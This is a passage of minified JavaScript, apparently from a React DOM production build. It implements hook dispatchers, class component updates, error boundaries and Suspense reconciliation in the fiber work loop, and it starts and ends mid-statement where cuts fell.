nt(l,t)?l:da.current!==null?(e=ac(e,l,a),nt(e,t)||(Ne=!0),e):(Gt&42)===0||(Gt&1073741824)!==0&&($&261930)===0?(Ne=!0,e.memoizedState=l):(e=rr(),V.lanes|=e,hl|=e,t)}function ro(e,t,l,a,n){var u=O.p;O.p=u!==0&&8>u?u:8;var i=S.T,c={};S.T=c,ic(e,!1,t,l);try{var s=n(),h=S.S;if(h!==null&&h(c,s),s!==null&&typeof s=="object"&&typeof s.then=="function"){var p=Xh(s,a);en(e,t,p,ot(e))}else en(e,t,a,ot(e))}catch(T){en(e,t,{then:function(){},status:"rejected",reason:T},ot())}finally{O.p=u,i!==null&&c.types!==null&&(i.types=c.types),S.T=i}}function Wh(){}function nc(e,t,l,a){if(e.tag!==5)throw Error(y(476));var n=ho(e).queue;ro(e,n,t,q,l===null?Wh:function(){return yo(e),l(a)})}function ho(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:q,baseState:q,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Xt,lastRenderedState:q},next:null};var l={};return t.next={memoizedState:l,baseState:l,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Xt,lastRenderedState:l},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function yo(e){var t=ho(e);t.next===null&&(t=e.alternate.memoizedState),en(e,t.next.queue,{},ot())}function uc(){return Ye(pn)}function mo(){return _e().memoizedState}function go(){return _e().memoizedState}function Fh(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var l=ot();e=cl(l);var a=sl(t,e,l);a!==null&&(Pe(a,t,l),Wa(a,t,l)),t={cache:Ri()},e.payload=t;return}t=t.return}}function $h(e,t,l){var a=ot();l={lane:a,revertLane:0,gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null},fu(e)?po(t,l):(l=Ei(e,t,l,a),l!==null&&(Pe(l,e,a),So(l,t,a)))}function vo(e,t,l){var a=ot();en(e,t,l,a)}function en(e,t,l,a){var n={lane:a,revertLane:0,gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null};if(fu(e))po(t,n);else{var u=e.alternate;if(e.lanes===0&&(u===null||u.lanes===0)&&(u=t.lastRenderedReducer,u!==null))try{var i=t.lastRenderedState,c=u(i,l);if(n.hasEagerState=!0,n.eagerState=c,nt(c,i))return Xn(e,t,n,0),me===null&&Gn(),!1}catch{}if(l=Ei(e,t,n,a),l!==null)return Pe(l,e,a),So(l,t,a),!0}return!1}function ic(e,t,l,a){if(a={lane:2,revertLane:Yc(),gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null},fu(e)){if(t)throw Error(y(479))}else t=Ei(e,l,a,2),t!==null&&Pe(t,e,2)}function fu(e){var t=e.alternate;return e===V||t!==null&&t===V}function po(e,t){ha=lu=!0;var l=e.pending;l===null?t.next=t:(t.next=l.next,l.next=t),e.pending=t}function So(e,t,l){if((l&4194048)!==0){var a=t.lanes;a&=e.pendingLanes,l|=a,t.lanes=l,As(e,l)}}var tn={readContext:Ye,use:uu,useCallback:be,useContext:be,useEffect:be,useImperativeHandle:be,useLayoutEffect:be,useInsertionEffect:be,useMemo:be,useReducer:be,useRef:be,useState:be,useDebugValue:be,useDeferredValue:be,useTransition:be,useSyncExternalStore:be,useId:be,useHostTransitionStatus:be,useFormState:be,useActionState:be,useOptimistic:be,useMemoCache:be,useCacheRefresh:be};tn.useEffectEvent=be;var bo={readContext:Ye,use:uu,useCallback:function(e,t){return Ze().memoizedState=[e,t===void 0?null:t],e},useContext:Ye,useEffect:lo,useImperativeHandle:function(e,t,l){l=l!=null?l.concat([e]):null,cu(4194308,4,io.bind(null,t,e),l)},useLayoutEffect:function(e,t){return cu(4194308,4,e,t)},useInsertionEffect:function(e,t){cu(4,2,e,t)},useMemo:function(e,t){var l=Ze();t=t===void 0?null:t;var a=e();if(Ll){Pt(!0);try{e()}finally{Pt(!1)}}return l.memoizedState=[a,t],a},useReducer:function(e,t,l){var a=Ze();if(l!==void 0){var n=l(t);if(Ll){Pt(!0);try{l(t)}finally{Pt(!1)}}}else n=t;return a.memoizedState=a.baseState=n,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},a.queue=e,e=e.dispatch=$h.bind(null,V,e),[a.memoizedState,e]},useRef:function(e){var t=Ze();return e={current:e},t.memoizedState=e},useState:function(e){e=Pi(e);var t=e.queue,l=vo.bind(null,V,t);return t.dispatch=l,[e.memoizedState,l]},useDebugValue:lc,useDeferredValue:function(e,t){var l=Ze();return ac(l,e,t)},useTransition:function(){var e=Pi(!1);return e=ro.bind(null,V,e.queue,!0,!1),Ze().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,l){var a=V,n=Ze();if(ee){if(l===void 0)throw Error(y(407));l=l()}else{if(l=t(),me===null)throw Error(y(349));($&127)!==0||Lf(a,t,l)}n.memoizedState=l;var u={value:l,getSnapshot:t};return n.queue=u,lo(Gf.bind(null,a,u,e),[e]),a.flags|=2048,ma(9,{destroy:void 0},kf.bind(null,a,u,l,t),null),l},useId:function(){var e=Ze(),t=me.identifierPrefix;if(ee){var l=Mt,a=Nt;l=(a&~(1<<32-at(a)-1)).toString(32)+l,t="_"+t+"R_"+l,l=au++,0<l&&(t+="H"+l.toString(32)),t+="_"}else l=Qh++,t="_"+t+"r_"+l.toString(32)+"_";return e.memoizedState=t},useHostTransitionStatus:uc,useFormState:$f,useActionState:$f,useOptimistic:function(e){var t=Ze();t.memoizedState=t.baseState=e;var l={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=l,t=ic.bind(null,V,!0,l),l.dispatch=t,[e,t]},useMemoCache:Fi,useCacheRefresh:function(){return Ze().memoizedState=Fh.bind(null,V)},useEffectEvent:function(e){var t=Ze(),l={impl:e};return t.memoizedState=l,function(){if((ne&2)!==0)throw Error(y(440));return l.impl.apply(void 0,arguments)}}},cc={readContext:Ye,use:uu,useCallback:so,useContext:Ye,useEffect:tc,useImperativeHandle:co,useInsertionEffect:no,useLayoutEffect:uo,useMemo:fo,useReducer:iu,useRef:to,useState:function(){return iu(Xt)},useDebugValue:lc,useDeferredValue:function(e,t){var l=_e();return oo(l,oe.memoizedState,e,t)},useTransition:function(){var e=iu(Xt)[0],t=_e().memoizedState;return[typeof e=="boolean"?e:Pa(e),t]},useSyncExternalStore:qf,useId:mo,useHostTransitionStatus:uc,useFormState:If,useActionState:If,useOptimistic:function(e,t){var l=_e();return Vf(l,oe,e,t)},useMemoCache:Fi,useCacheRefresh:go};cc.useEffectEvent=ao;var To={readContext:Ye,use:uu,useCallback:so,useContext:Ye,useEffect:tc,useImperativeHandle:co,useInsertionEffect:no,useLayoutEffect:uo,useMemo:fo,useReducer:Ii,useRef:to,useState:function(){return Ii(Xt)},useDebugValue:lc,useDeferredValue:function(e,t){var l=_e();return oe===null?ac(l,e,t):oo(l,oe.memoizedState,e,t)},useTransition:function(){var e=Ii(Xt)[0],t=_e().memoizedState;return[typeof e=="boolean"?e:Pa(e),t]},useSyncExternalStore:qf,useId:mo,useHostTransitionStatus:uc,useFormState:eo,useActionState:eo,useOptimistic:function(e,t){var l=_e();return oe!==null?Vf(l,oe,e,t):(l.baseState=e,[e,l.queue.dispatch])},useMemoCache:Fi,useCacheRefresh:go};To.useEffectEvent=ao;function sc(e,t,l,a){t=e.memoizedState,l=l(a,t),l=l==null?t:j({},t,l),e.memoizedState=l,e.lanes===0&&(e.updateQueue.baseState=l)}var fc={enqueueSetState:function(e,t,l){e=e._reactInternals;var a=ot(),n=cl(a);n.payload=t,l!=null&&(n.callback=l),t=sl(e,n,a),t!==null&&(Pe(t,e,a),Wa(t,e,a))},enqueueReplaceState:function(e,t,l){e=e._reactInternals;var a=ot(),n=cl(a);n.tag=1,n.payload=t,l!=null&&(n.callback=l),t=sl(e,n,a),t!==null&&(Pe(t,e,a),Wa(t,e,a))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var l=ot(),a=cl(l);a.tag=2,t!=null&&(a.callback=t),t=sl(e,a,l),t!==null&&(Pe(t,e,l),Wa(t,e,l))}};function Ao(e,t,l,a,n,u,i){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(a,u,i):t.prototype&&t.prototype.isPureReactComponent?!ka(l,a)||!ka(n,u):!0}function Eo(e,t,l,a){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(l,a),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(l,a),t.state!==e&&fc.enqueueReplaceState(t,t.state,null)}function kl(e,t){var l=t;if("ref"in t){l={};for(var a in t)a!=="ref"&&(l[a]=t[a])}if(e=e.defaultProps){l===t&&(l=j({},l));for(var n in e)l[n]===void 0&&(l[n]=e[n])}return l}function zo(e){kn(e)}function Oo(e){console.error(e)}function Co(e){kn(e)}function ou(e,t){try{var l=e.onUncaughtError;l(t.value,{componentStack:t.stack})}catch(a){setTimeout(function(){throw a})}}function _o(e,t,l){try{var a=e.onCaughtError;a(l.value,{componentStack:l.stack,errorBoundary:t.tag===1?t.stateNode:null})}catch(n){setTimeout(function(){throw n})}}function oc(e,t,l){return l=cl(l),l.tag=3,l.payload={element:null},l.callback=function(){ou(e,t)},l}function Do(e){return e=cl(e),e.tag=3,e}function Ho(e,t,l,a){var n=l.type.getDerivedStateFromError;if(typeof n=="function"){var u=a.value;e.payload=function(){return n(u)},e.callback=function(){_o(t,l,a)}}var i=l.stateNode;i!==null&&typeof i.componentDidCatch=="function"&&(e.callback=function(){_o(t,l,a),typeof n!="function"&&(yl===null?yl=new Set([this]):yl.add(this));var c=a.stack;this.componentDidCatch(a.value,{componentStack:c!==null?c:""})})}function Ih(e,t,l,a,n){if(l.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){if(t=l.alternate,t!==null&&ca(t,l,n,!0),l=it.current,l!==null){switch(l.tag){case 31:case 13:return St===null?Au():l.alternate===null&&Te===0&&(Te=3),l.flags&=-257,l.flags|=65536,l.lanes=n,a===$n?l.flags|=16384:(t=l.updateQueue,t===null?l.updateQueue=new Set([a]):t.add(a),wc(e,a,n)),!1;case 22:return l.flags|=65536,a===$n?l.flags|=16384:(t=l.updateQueue,t===null?(t={transitions:null,markerInstances:null,retryQueue:new Set([a])},l.updateQueue=t):(l=t.retryQueue,l===null?t.retryQueue=new Set([a]):l.add(a)),wc(e,a,n)),!1}throw Error(y(435,l.tag))}return wc(e,a,n),Au(),!1}if(ee)return t=it.current,t!==null?((t.flags&65536)===0&&(t.flags|=256),t.flags|=65536,t.lanes=n,a!==Hi&&(e=Error(y(422),{cause:a}),Qa(mt(e,l)))):(a!==Hi&&(t=Error(y(423),{cause:a}),Qa(mt(t,l))),e=e.current.alternate,e.flags|=65536,n&=-n,e.lanes|=n,a=mt(a,l),n=oc(e.stateNode,a,n),Li(e,n),Te!==4&&(Te=2)),!1;var u=Error(y(520),{cause:a});if(u=mt(u,l),on===null?on=[u]:on.push(u),Te!==4&&(Te=2),t===null)return!0;a=mt(a,l),l=t;do{switch(l.tag){case 3:return l.flags|=65536,e=n&-n,l.lanes|=e,e=oc(l.stateNode,a,e),Li(l,e),!1;case 1:if(t=l.type,u=l.stateNode,(l.flags&128)===0&&(typeof t.getDerivedStateFromError=="function"||u!==null&&typeof u.componentDidCatch=="function"&&(yl===null||!yl.has(u))))return l.flags|=65536,n&=-n,l.lanes|=n,n=Do(n),Ho(n,e,l,a),Li(l,n),!1}l=l.return}while(l!==null);return!1}var rc=Error(y(461)),Ne=!1;function qe(e,t,l,a){t.child=e===null?xf(t,null,l,a):ql(t,e.child,l,a)}function No(e,t,l,a,n){l=l.render;var u=t.ref;if("ref"in a){var i={};for(var c in a)c!=="ref"&&(i[c]=a[c])}else i=a;return wl(t),a=Zi(e,t,l,i,u,n),c=Ki(),e!==null&&!Ne?(Ji(e,t,n),Qt(e,t,n)):(ee&&c&&_i(t),t.flags|=1,qe(e,t,a,n),t.child)}function Mo(e,t,l,a,n){if(e===null){var u=l.type;return typeof u=="function"&&!zi(u)&&u.defaultProps===void 0&&l.compare===null?(t.tag=15,t.type=u,xo(e,t,u,a,n)):(e=Vn(l.type,null,a,t,t.mode,n),e.ref=t.ref,e.return=t,t.child=e)}if(u=e.child,!Sc(e,n)){var i=u.memoizedProps;if(l=l.compare,l=l!==null?l:ka,l(i,a)&&e.ref===t.ref)return Qt(e,t,n)}return t.flags|=1,e=Yt(u,a),e.ref=t.ref,e.return=t,t.child=e}function xo(e,t,l,a,n){if(e!==null){var u=e.memoizedProps;if(ka(u,a)&&e.ref===t.ref)if(Ne=!1,t.pendingProps=a=u,Sc(e,n))(e.flags&131072)!==0&&(Ne=!0);else return t.lanes=e.lanes,Qt(e,t,n)}return dc(e,t,l,a,n)}function Uo(e,t,l,a){var n=a.children,u=e!==null?e.memoizedState:null;if(e===null&&t.stateNode===null&&(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),a.mode==="hidden"){if((t.flags&128)!==0){if(u=u!==null?u.baseLanes|l:l,e!==null){for(a=t.child=e.child,n=0;a!==null;)n=n|a.lanes|a.childLanes,a=a.sibling;a=n&~u}else a=0,t.child=null;return Ro(e,t,u,l,a)}if((l&536870912)!==0)t.memoizedState={baseLanes:0,cachePool:null},e!==null&&Wn(t,u!==null?u.cachePool:null),u!==null?wf(t,u):Gi(),jf(t);else return a=t.lanes=536870912,Ro(e,t,u!==null?u.baseLanes|l:l,l,a)}else u!==null?(Wn(t,u.cachePool),wf(t,u),ol(),t.memoizedState=null):(e!==null&&Wn(t,null),Gi(),ol());return qe(e,t,n,l),t.child}function ln(e,t){return e!==null&&e.tag===22||t.stateNode!==null||(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),t.sibling}function Ro(e,t,l,a,n){var u=ji();return u=u===null?null:{parent:De._currentValue,pool:u},t.memoizedState={baseLanes:l,cachePool:u},e!==null&&Wn(t,null),Gi(),jf(t),e!==null&&ca(e,t,a,!0),t.childLanes=n,null}function ru(e,t){return t=hu({mode:t.mode,children:t.children},e.mode),t.ref=e.ref,e.child=t,t.return=e,t}function wo(e,t,l){return ql(t,e.child,null,l),e=ru(t,t.pendingProps),e.flags|=2,ct(t),t.memoizedState=null,e}function Ph(e,t,l){var a=t.pendingProps,n=(t.flags&128)!==0;if(t.flags&=-129,e===null){if(ee){if(a.mode==="hidden")return e=ru(t,a),t.lanes=536870912,ln(null,e);if(Qi(t),(e=ve)?(e=Kr(e,pt),e=e!==null&&e.data==="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:ll!==null?{id:Nt,overflow:Mt}:null,retryLane:536870912,hydrationErrors:null},l=vf(e),l.return=t,t.child=l,Be=t,ve=null)):e=null,e===null)throw nl(t);return t.lanes=536870912,null}return ru(t,a)}var u=e.memoizedState;if(u!==null){var i=u.dehydrated;if(Qi(t),n)if(t.flags&256)t.flags&=-257,t=wo(e,t,l);else if(t.memoizedState!==null)t.child=e.child,t.flags|=128,t=null;else throw Error(y(558));else if(Ne||ca(e,t,l,!1),n=(l&e.childLanes)!==0,Ne||n){if(a=me,a!==null&&(i=Es(a,l),i!==0&&i!==u.retryLane))throw u.retryLane=i,Ml(e,i),Pe(a,e,i),rc;Au(),t=wo(e,t,l)}else e=u.treeContext,ve=bt(i.nextSibling),Be=t,ee=!0,al=null,pt=!1,e!==null&&bf(t,e),t=ru(t,a),t.flags|=4096;return t}return e=Yt(e.child,{mode:a.mode,children:a.children}),e.ref=t.ref,t.child=e,e.return=t,e}function du(e,t){var l=t.ref;if(l===null)e!==null&&e.ref!==null&&(t.flags|=4194816);else{if(typeof l!="function"&&typeof l!="object")throw Error(y(284));(e===null||e.ref!==l)&&(t.flags|=4194816)}}function dc(e,t,l,a,n){return wl(t),l=Zi(e,t,l,a,void 0,n),a=Ki(),e!==null&&!Ne?(Ji(e,t,n),Qt(e,t,n)):(ee&&a&&_i(t),t.flags|=1,qe(e,t,l,n),t.child)}function jo(e,t,l,a,n,u){return wl(t),t.updateQueue=null,l=Yf(t,a,l,n),Bf(e),a=Ki(),e!==null&&!Ne?(Ji(e,t,u),Qt(e,t,u)):(ee&&a&&_i(t),t.flags|=1,qe(e,t,l,u),t.child)}function Bo(e,t,l,a,n){if(wl(t),t.stateNode===null){var u=aa,i=l.contextType;typeof i=="object"&&i!==null&&(u=Ye(i)),u=new l(a,u),t.memoizedState=u.state!==null&&u.state!==void 0?u.state:null,u.updater=fc,t.stateNode=u,u._reactInternals=t,u=t.stateNode,u.props=a,u.state=t.memoizedState,u.refs={},Yi(t),i=l.contextType,u.context=typeof i=="object"&&i!==null?Ye(i):aa,u.state=t.memoizedState,i=l.getDerivedStateFromProps,typeof i=="function"&&(sc(t,l,i,a),u.state=t.memoizedState),typeof l.getDerivedStateFromProps=="function"||typeof u.getSnapshotBeforeUpdate=="function"||typeof u.UNSAFE_componentWillMount!="function"&&typeof u.componentWillMount!="function"||(i=u.state,typeof u.componentWillMount=="function"&&u.componentWillMount(),typeof u.UNSAFE_componentWillMount=="function"&&u.UNSAFE_componentWillMount(),i!==u.state&&fc.enqueueReplaceState(u,u.state,null),$a(t,a,u,n),Fa(),u.state=t.memoizedState),typeof u.componentDidMount=="function"&&(t.flags|=4194308),a=!0}else if(e===null){u=t.stateNode;var c=t.memoizedProps,s=kl(l,c);u.props=s;var h=u.context,p=l.contextType;i=aa,typeof p=="object"&&p!==null&&(i=Ye(p));var T=l.getDerivedStateFromProps;p=typeof T=="function"||typeof u.getSnapshotBeforeUpdate=="function",c=t.pendingProps!==c,p||typeof u.UNSAFE_componentWillReceiveProps!="function"&&typeof u.componentWillReceiveProps!="function"||(c||h!==i)&&Eo(t,u,a,i),il=!1;var m=t.memoizedState;u.state=m,$a(t,a,u,n),Fa(),h=t.memoizedState,c||m!==h||il?(typeof T=="function"&&(sc(t,l,T,a),h=t.memoizedState),(s=il||Ao(t,l,s,a,m,h,i))?(p||typeof u.UNSAFE_componentWillMount!="function"&&typeof u.componentWillMount!="function"||(typeof u.componentWillMount=="function"&&u.componentWillMount(),typeof u.UNSAFE_componentWillMount=="function"&&u.UNSAFE_componentWillMount()),typeof u.componentDidMount=="function"&&(t.flags|=4194308)):(typeof u.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=a,t.memoizedState=h),u.props=a,u.state=h,u.context=i,a=s):(typeof u.componentDidMount=="function"&&(t.flags|=4194308),a=!1)}else{u=t.stateNode,qi(e,t),i=t.memoizedProps,p=kl(l,i),u.props=p,T=t.pendingProps,m=u.context,h=l.contextType,s=aa,typeof h=="object"&&h!==null&&(s=Ye(h)),c=l.getDerivedStateFromProps,(h=typeof c=="function"||typeof u.getSnapshotBeforeUpdate=="function")||typeof u.UNSAFE_componentWillReceiveProps!="function"&&typeof u.componentWillReceiveProps!="function"||(i!==T||m!==s)&&Eo(t,u,a,s),il=!1,m=t.memoizedState,u.state=m,$a(t,a,u,n),Fa();var g=t.memoizedState;i!==T||m!==g||il||e!==null&&e.dependencies!==null&&Kn(e.dependencies)?(typeof c=="function"&&(sc(t,l,c,a),g=t.memoizedState),(p=il||Ao(t,l,p,a,m,g,s)||e!==null&&e.dependencies!==null&&Kn(e.dependencies))?(h||typeof u.UNSAFE_componentWillUpdate!="function"&&typeof u.componentWillUpdate!="function"||(typeof u.componentWillUpdate=="function"&&u.componentWillUpdate(a,g,s),typeof u.UNSAFE_componentWillUpdate=="function"&&u.UNSAFE_componentWillUpdate(a,g,s)),typeof u.componentDidUpdate=="function"&&(t.flags|=4),typeof u.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof u.componentDidUpdate!="function"||i===e.memoizedProps&&m===e.memoizedState||(t.flags|=4),typeof u.getSnapshotBeforeUpdate!="function"||i===e.memoizedProps&&m===e.memoizedState||(t.flags|=1024),t.memoizedProps=a,t.memoizedState=g),u.props=a,u.state=g,u.context=s,a=p):(typeof u.componentDidUpdate!="function"||i===e.memoizedProps&&m===e.memoizedState||(t.flags|=4),typeof u.getSnapshotBeforeUpdate!="function"||i===e.memoizedProps&&m===e.memoizedState||(t.flags|=1024),a=!1)}return u=a,du(e,t),a=(t.flags&128)!==0,u||a?(u=t.stateNode,l=a&&typeof l.getDerivedStateFromError!="function"?null:u.render(),t.flags|=1,e!==null&&a?(t.child=ql(t,e.child,null,n),t.child=ql(t,null,l,n)):qe(e,t,l,n),t.memoizedState=u.state,e=t.child):e=Qt(e,t,n),e}function Yo(e,t,l,a){return Ul(),t.flags|=256,qe(e,t,l,a),t.child}var hc={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function yc(e){return{baseLanes:e,cachePool:Cf()}}function mc(e,t,l){return e=e!==null?e.childLanes&~l:0,t&&(e|=ft),e}function qo(e,t,l){var a=t.pendingProps,n=!1,u=(t.flags&128)!==0,i;if((i=u)||(i=e!==null&&e.memoizedState===null?!1:(Ce.current&2)!==0),i&&(n=!0,t.flags&=-129),i=(t.flags&32)!==0,t.flags&=-33,e===null){if(ee){if(n?fl(t):ol(),(e=ve)?(e=Kr(e,pt),e=e!==null&&e.data!=="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:ll!==null?{id:Nt,overflow:Mt}:null,retryLane:536870912,hydrationErrors:null},l=vf(e),l.return=t,t.child=l,Be=t,ve=null)):e=null,e===null)throw nl(t);return $c(e)?t.lanes=32:t.lanes=536870912,null}var c=a.children;return a=a.fallback,n?(ol(),n=t.mode,c=hu({mode:"hidden",children:c},n),a=xl(a,n,l,null),c.return=t,a.return=t,c.sibling=a,t.child=c,a=t.child,a.memoizedState=yc(l),a.childLanes=mc(e,i,l),t.memoizedState=hc,ln(null,a)):(fl(t),gc(t,c))}var s=e.memoizedState;if(s!==null&&(c=s.dehydrated,c!==null)){if(u)t.flags&256?(fl(t),t.flags&=-257,t=vc(e,t,l)):t.memoizedState!==null?(ol(),t.child=e.child,t.flags|=128,t=null):(ol(),c=a.fallback,n=t.mode,a=hu({mode:"visible",children:a.children},n),c=xl(c,n,l,null),c.flags|=2,a.return=t,c.return=t,a.sibling=c,t.child=a,ql(t,e.child,null,l),a=t.child,a.memoizedState=yc(l),a.childLanes=mc(e,i,l),t.memoizedState=hc,t=ln(null,a));else if(fl(t),$c(c)){if(i=c.nextSibling&&c.nextSibling.dataset,i)var h=i.dgst;i=h,a=Error(y(419)),a.stack="",a.digest=i,Qa({value:a,source:null,stack:null}),t=vc(e,t,l)}else if(Ne||ca(e,t,l,!1),i=(l&e.childLanes)!==0,Ne||i){if(i=me,i!==null&&(a=Es(i,l),a!==0&&a!==s.retryLane))throw s.retryLane=a,Ml(e,a),Pe(i,e,a),rc;Fc(c)||Au(),t=vc(e,t,l)}else Fc(c)?(t.flags|=192,t.child=e.child,t=null):(e=s.treeContext,ve=bt(c.nextSibling),Be=t,ee=!0,al=null,pt=!1,e!==null&&bf(t,e),t=gc(t,a.children),t.flags|=4096);return t}return n?(ol(),c=a.fallback,n=t.mode,s=e.child,h=s.sibling,a=Yt(s,{mode:"hidden",children:a.children}),a.subtreeFlags=s.subtreeFlags&65011712,h!==null?c=Yt(h,c):(c=xl(c,n,l,null),c.flags|=2),c.return=t,a.return=t,a.sibling=c,t.child=a,ln(null,a),a=t.child,c=e.child.memoizedState,c===null?c=yc(l):(n=c.cachePool,n!==null?(s=De._currentValue,n=n.parent!==s?{parent:s,pool:s}:n):n=Cf(),c={baseLanes:c.baseLanes|l,cachePool:n}),a.memoizedState=c,a.childLanes=mc(e,i,l),t.memoizedState=hc,ln(e.child,a)):(fl(t),l=e.child,e=l.sibling,l=Yt(l,{mode:"visible",children:a.children}),l.return=t,l.sibling=null,e!==null&&(i=t.deletions,i===null?(t.deletions=[e],t.flags|=16):i.push(e)),t.child=l,t.memoizedState=null,l)}function gc(e,t){return t=hu({mode:"visible",children:t},e.mode),t.return=e,e.child=t}function hu(e,t){return e=ut(22,e,null,t),e.lanes=0,e}function vc(e,t,l){return ql(t,e.child,null,l),e=gc(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function Lo(e,t,l){e.lanes|=t;var a=e.alternate;a!==null&&(a.lanes|=t),xi(e.return,t,l)}function pc(e,t,l,a,n,u){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:a,tail:l,tailMode:n,treeForkCount:u}:(i.isBackwards=t,i.rendering=null,i.renderingStartTime=0,i.last=a,i.tail=l,i.tailMode=n,i.treeForkCount=u)}function ko(e,t,l){var a=t.pendingProps,n=a.revealOrder,u=a.tail;a=a.children;var i=Ce.current,c=(i&2)!==0;if(c?(i=i&1|2,t.flags|=128):i&=1,C(Ce,i),qe(e,t,a,l),a=ee?Xa:0,!c&&e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Lo(e,l,t);else if(e.tag===19)Lo(e,l,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}switch(n){case"forwards":for(l=t.child,n=null;l!==null;)e=l.alternate,e!==null&&tu(e)===null&&(n=l),l=l.sibling;l=n,l===null?(n=t.child,t.child=null):(n=l.sibling,l.sibling=null),pc(t,!1,n,l,u,a);break;case"backwards":case"unstable_legacy-backwards":for(l=null,n=t.child,t.child=null;n!==null;){if(e=n.alternate,e!==null&&tu(e)===null){t.child=n;break}e=n.sibling,n.sibling=l,l=n,n=e}pc(t,!0,l,null,u,a);break;case"together":pc(t,!1,null,null,void 0,a);break;default:t.memoizedState=null}return t.child}function Qt(e,t,l){if(e!==null&&(t.dependencies=e.dependencies),hl|=t.lanes,(l&t.childLanes)===0)if(e!==null){if(ca(e,t,l,!1),(l&t.childLanes)===0)return null}else return null;if(e!==null&&t.child!==e.child)throw Error(y(153));if(t.child!==null){for(e=t.child,l=Yt(e,e.pendingProps),t.child=l,l.return=t;e.sibling!==null;)e=e.sibling,l=l.sibling=Yt(e,e.pendingProps),l.return=t;l.sibling=null}return t.child}function Sc(e,t){return(e.lanes&t)!==0?!0:(e=e.dependencies,!!(e!==null&&Kn(e)))}function ey(e,t,l){switch(t.tag){case 3:Ve(t,t.stateNode.containerInfo),ul(t,De,e.memoizedState.cache),Ul();break;case 27:case 5:Da(t);break;case 4:Ve(t,t.stateNode.containerInfo);break;case 10:ul(t,t.type,t.memoizedProps.value);break;case 31:if(t.memoizedState!==null)return t.flags|=128,Qi(t),null;break;case 13:var a=t.memoizedState;if(a!==null)return a.dehydrated!==null?(fl(t),t.flags|=128,null):(l&t.child.childLanes)!==0?qo(e,t,l):(fl(t),e=Qt(e,t,l),e!==null?e.sibling:null);fl(t);break;case 19:var n=(e.flags&128)!==0;if(a=(l&t.childLanes)!==0,a||(ca(e,t,l,!1),a=(l&t.childLanes)!==0),n){if(a)return ko(e,t,l);t.flags|=128}if(n=t.memoizedState,n!==null&&(n.rendering=null,n.tail=null,n.lastEffect=null),C(Ce,Ce.current),a)break;return null;case 22:return t.lanes=0,Uo(e,t,l,t.pendingProps);case 24:ul(t,De,e.memoizedState.cache)}return Qt(e,t,l)}function Go(e,t,l){if(e!==null)if(e.memoizedProps!==t.pendingProps)Ne=!0;else{if(!Sc(e,l)&&(t.flags&128)===0)return Ne=!1,ey(e,t,l);Ne=(e.flags&131072)!==0}else Ne=!1,ee&&(t.flags&1048576)!==0&&Sf(t,Xa,t.index);switch(t.lanes=0,t.tag){case 16:e:{var a=t.pendingProps;if(e=Bl(t.elementType),t.type=e,typeof e=="function")zi(e)?(a=kl(e,a),t.tag=1,t=Bo(null,t,e,a,l)):(t.tag=0,t=dc(null,t,e,a,l));else{if(e!=null){var n=e.$$typeof;if(n===we){t.tag=11,t=No(null,t,e,a,l);break e}else if(n===Y){t.tag=14,t=Mo(null,t,e,a,l);break e}}throw t=Rt(e)||e,Error(y(306,t,""))}}return t;case 0:return dc(e,t,t.type,t.pendingProps,l);case 1:return a=t.type,n=kl(a,t.pendingProps),Bo(e,t,a,n,l);case 3:e:{if(Ve(t,t.stateNode.containerInfo),e===null)throw Error(y(387));a=t.pendingProps;var u=t.memoizedState;n=u.element,qi(e,t),$a(t,a,null,l);var i=t.memoizedState;if(a=i.cache,ul(t,De,a),a!==u.cache&&Ui(t,[De],l,!0),Fa(),a=i.element,u.isDehydrated)if(u={element:a,isDehydrated:!1,cache:i.cache},t.updateQueue.baseState=u,t.memoizedState=u,t.flags&256){t=Yo(e,t,a,l);break e}else if(a!==n){n=mt(Error(y(424)),t),Qa(n),t=Yo(e,t,a,l);break e}else for(e=t.stateNode.containerInfo,e.nodeType===9?e=e.body:e=e.nodeName==="HTML"?e.ownerDocument.body:e,ve=bt(e.firstChild),Be=t,ee=!0,al=null,pt=!0,l=xf(t,null,a,l),t.child=l;l;)l.flags=l.flags&-3|4096,l=l.sibling;else{if(Ul(),a===n){t=Qt(e,t,l);break e}qe(e,t,a,l)}t=t.child}return t;case 26:return du(e,t),e===null?(l=Pr(t.type,null,t.pendingProps,null))?t.memoizedState=l:ee||(l=t.type,e=t.pendingProps,a=Hu(J.current).createElement(l),a[je]=t,a[Ke]=e,Le(a,l,e),Ue(a),t.stateNode=a):t.memoizedState=Pr(t.type,e.memoizedProps,t.pendingProps,e.memoizedState),null;case 27:return 